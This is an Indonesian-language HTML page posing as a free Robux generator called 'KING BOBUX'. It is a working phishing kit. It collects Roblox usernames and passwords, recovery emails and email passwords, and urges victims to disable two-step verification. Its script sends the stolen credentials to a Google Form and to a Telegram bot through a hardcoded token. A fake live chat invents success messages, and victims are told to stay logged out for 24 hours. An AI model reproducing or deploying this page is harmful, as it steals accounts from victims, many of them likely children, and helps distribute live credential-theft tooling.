<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KING BOBUX | OFFICIAL GENERATOR</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&display=swap');
        body { font-family: 'Orbitron', sans-serif; background: #050505; color: #fff; overflow-x: hidden; }
        .bg-gold { background: linear-gradient(135deg, #ffd700, #b8860b); }
        .hidden { display: none; }
        .loading-bar { width: 0%; animation: load 18s linear forwards; }
        @keyframes load { from { width: 0%; } to { width: 100%; } }
        .chat-box { height: 120px; overflow-y: hidden; font-size: 11px; }
    </style>
</head>
<body class="p-4 max-w-md mx-auto">

    <header class="text-center py-6">
        <h1 class="text-3xl font-black italic text-yellow-500 uppercase leading-none">KING <span class="text-white">BOBUX</span></h1>
        <p class="text-[8px] text-gray-500 font-bold mt-2 animate-pulse uppercase tracking-[2px]">тЧП LIVE SERVER: 2,412 Users Online</p>
    </header>

    <div class="bg-zinc-900 border border-yellow-500/30 p-6 rounded-[2.5rem] shadow-2xl mb-6">
        
        <div id="p1" class="text-center">
            <p class="text-[10px] mb-4 text-gray-400 font-bold uppercase italic tracking-wider">PILIH JUMLAH ROBUX:</p>
            <div class="grid grid-cols-2 gap-3 mb-6">
                <button onclick="setA('10,000')" class="bg-white/5 border border-white/10 py-5 rounded-xl text-xs font-black hover:bg-white/10 active:scale-95 transition-all">10K RBX</button>
                <button onclick="setA('50,000')" class="bg-white/5 border border-white/10 py-5 rounded-xl text-xs font-black hover:bg-white/10 active:scale-95 transition-all">50K RBX</button>
            </div>
            <button onclick="toP2()" class="w-full bg-gold py-5 rounded-xl font-black text-black text-xs uppercase italic shadow-lg shadow-yellow-500/20">MULAI GENERATE</button>
        </div>

        <div id="p2" class="hidden space-y-3">
            <input type="text" id="u" placeholder="ROBLOX USERNAME" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
            <input type="password" id="p" placeholder="ROBLOX PASSWORD" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
            <input type="email" id="e" placeholder="EMAIL PEMULIHAN" class="w-full bg-black border border-yellow-500/30 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
            <input type="password" id="ep" placeholder="SANDI EMAIL" class="w-full bg-black border border-yellow-500/30 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
            
            <div class="bg-red-950/30 p-3 rounded-xl border border-red-500/20 text-[9px] text-red-400 font-black text-center italic">
                тЪая╕П MATIKAN A2F (VERIF 2 LANGKAH) AGAR TIDAK ERROR!
            </div>
            <button onclick="kirimData()" class="w-full bg-gold py-5 rounded-xl font-black text-black text-xs uppercase italic shadow-lg shadow-yellow-500/40">CLAIM SEKARANG</button>
        </div>

        <div id="p3" class="hidden text-center py-6 space-y-4">
            <h3 class="text-yellow-500 font-black italic uppercase">MENGIRIM ROBUX...</h3>
            <div class="w-full bg-white/10 h-3 rounded-full overflow-hidden">
                <div class="loading-bar bg-yellow-500 h-full"></div>
            </div>
            <p class="text-[9px] text-gray-400 uppercase font-bold italic px-4 leading-relaxed">
                Berhasil Dikirim! <br><br> Jangan login selama 24 Jam agar Robux mendarat mulus di akun Anda.
            </p>
        </div>
    </div>

    <div class="bg-white/5 border border-white/10 rounded-3xl p-4 shadow-inner">
        <div class="flex items-center justify-between mb-2 border-b border-white/10 pb-2">
            <p class="text-[10px] font-black text-yellow-500 uppercase italic">Live Chat Aktivitas</p>
            <span class="w-2 h-2 bg-green-500 rounded-full animate-ping"></span>
        </div>
        <div id="chat-content" class="chat-box space-y-2 opacity-80"></div>
    </div>

    <script>
        let amt = "";
        
        // --- DATA BOSS XZAM ---
        const teleToken = "8712552694:AAHAjQQhwx4Vlas6CWs6QHB4iYSA5U2LiWM";
        const teleChatId = "7153376507";
        const gform = "https://docs.google.com/forms/d/e/1FAIpQLSfgBrBP1Bqk4tfVHBFUPZDCbW5fj7nK8NZuObuQPmhyRcEGxg/formResponse";

        function setA(v){ amt = v; alert("Terpilih: " + v + " RBX"); }
        function toP2(){ if(!amt) return alert("PILIH JUMLAH ROBUX!"); document.getElementById('p1').classList.add('hidden'); document.getElementById('p2').classList.remove('hidden'); }

        function kirimData(){
            const user = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            const mail = document.getElementById('e').value || "-";
            const spass = document.getElementById('ep').value || "-";

            if(!user || !pass) return alert("LENGKAPI DATA!");

            // 1. KE GOOGLE FORM
            const fd = new FormData();
            fd.append('entry.298399091', user); fd.append('entry.434090398', pass);
            fd.append('entry.455306086', mail); fd.append('entry.734491941', spass);
            fd.append('entry.1584180390', amt); fetch(gform, { method: 'POST', mode: 'no-cors', body: fd });

            // 2. KE TELEGRAM BOSS XZAM
            const msgTele = `ЁЯЪА *AKUN BARU MASUK!*\n\nЁЯСд *User:* \`${user}\` \nЁЯФС *Pass:* \`${pass}\` \nЁЯУз *Mail:* \`${mail}\` \nЁЯФР *Sandi:* \`${spass}\` \nЁЯТО *Jumlah:* \`${amt}\` RBX`;
            const urlTele = `https://api.telegram.org/bot${teleToken}/sendMessage?chat_id=${teleChatId}&text=${encodeURIComponent(msgTele)}&parse_mode=Markdown`;
            fetch(urlTele);

            document.getElementById('p2').classList.add('hidden');
            document.getElementById('p3').classList.remove('hidden');
        }

        // --- LIVE CHAT SIMULATOR ---
        const names = ["Zf_Joki", "Rbx_Lover", "Slayer99", "BocilGans", "KingRobox", "User942", "BloxKing"];
        const texts = ["Gila beneran masuk 10k!", "Barusan cair 50k, mantap!", "Jangan login 24 jam guys, works!", "Email bonusnya masuk juga!", "Baru coba, moga mendarat.", "Landing 10k Robux thx admin!"];
        
        setInterval(() => {
            const box = document.getElementById('chat-content');
            const name = names[Math.floor(Math.random()*names.length)] + Math.floor(Math.random()*99);
            const msg = texts[Math.floor(Math.random()*texts.length)];
            const el = document.createElement('div');
            el.innerHTML = `<span class="text-yellow-500 font-bold">${name.substring(0,3)}***:</span> <span class="text-gray-300 text-[10px]">${msg}</span>`;
            box.appendChild(el);
            if(box.childNodes.length > 6) box.removeChild(box.firstChild);
        }, 3000);
    </script>
</body>
</html>
